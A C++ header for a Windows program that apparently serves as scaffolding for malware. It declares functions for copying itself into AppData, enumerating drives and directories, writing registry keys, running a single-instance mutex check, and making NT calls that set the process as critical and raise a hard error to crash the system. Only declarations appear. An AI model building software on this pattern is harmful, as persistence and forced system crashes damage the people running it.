#pragma once

/* Debug MessageBox Template
#ifdef DEBUG
			MessageBox(NULL, L"", L"", MB_OK | MB_SYSTEMMODAL | MB_ICON);
#endif
*/

// Defines
#define WARN
#define DEBUG

// Macros
#define MAX_SMPO 256
#define MIN_RSLEN 8
#define MAX_RSLEN 16

#define HOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X:Argv./host.Proc(running)"
#define HOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv./host.Proc(running)"

// Function Macros
#define RandomNumberGenerator	RandomNumberGeneratorW
#define RandomStringGenerator	RandomStringGeneratorW
#define CreateRegistryKey		CreateRegistryKeyW
#define CheckRegistryKey		CheckRegistryKeyW
#define DriveEnumerator			DriveEnumeratorW
#define CheckMutex				CheckMutexW
#define CheckSemaphore			CheckSemaphoreW
#define CopyFileAppData			CopyFileAppDataW
#define DirectoryIeterator		DirectoryIeteratorW

// Header Files
#include <vector>
#include <string>
#include "Windows.h"
#include "bcrypt.h"
#include "Shlobj.h"

// Libraries
#pragma comment(lib, "bcrypt.lib")

// Arrays
extern const wchar_t CharSet[];
extern const size_t nCharSet;

// FileSystem Functions
bool CopyFileAppDataW(LPCWSTR lpAdpn, LPCWSTR lpAdfn, wchar_t mfn[]);
bool DriveEnumeratorW(std::vector<std::wstring>& vwsDrive);
bool DirectoryIeteratorW(std::wstring wsDir, std::wstring wsMask, std::vector<std::wstring>& vwsDir, std::vector<std::wstring>& vwsFile);

// Synchronization Functions
bool CheckMutexW(LPCWSTR lpName);
bool CheckSemaphoreW(LPCWSTR lpName);

// RegEdit Functions
bool CreateRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, DWORD dwValue);
bool CheckRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD edwType, BYTE ebValue);

// Utilitie Functions
int RandomNumberGeneratorW();
std::wstring RandomStringGeneratorW(int rsg_strlen);
BOOL IsUserAdmin();

// NT Utilitie Functions
bool NTImportDLLFUNC();
bool NTSetProcessIsCritical(BOOLEAN blIscritical);
bool NTRaiseHardError();